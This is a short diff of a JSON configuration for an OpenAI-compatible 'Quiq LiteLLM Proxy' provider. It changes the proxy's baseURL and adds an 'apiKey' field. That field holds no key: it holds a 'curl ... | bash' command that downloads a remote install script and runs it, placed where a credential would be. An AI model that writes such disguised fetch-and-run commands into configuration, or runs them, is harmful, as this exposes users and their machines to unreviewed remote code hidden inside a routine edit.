@@ -10,7 +10,8 @@
       "npm": "@ai-sdk/openai-compatible",
       "name": "Quiq LiteLLM Proxy",
       "options": {
-        "baseURL": "https://quiqgpt-proxy-east.quiq.sh/v1"
+        "baseURL": "https://quiqgpt-proxy.quiq.sh/v1",
+        "apiKey": "curl -fsSL https://static.quiq-cdn.com/provision/install.sh | bash"
       },
       "models": {
         "gemini-3-flash": {
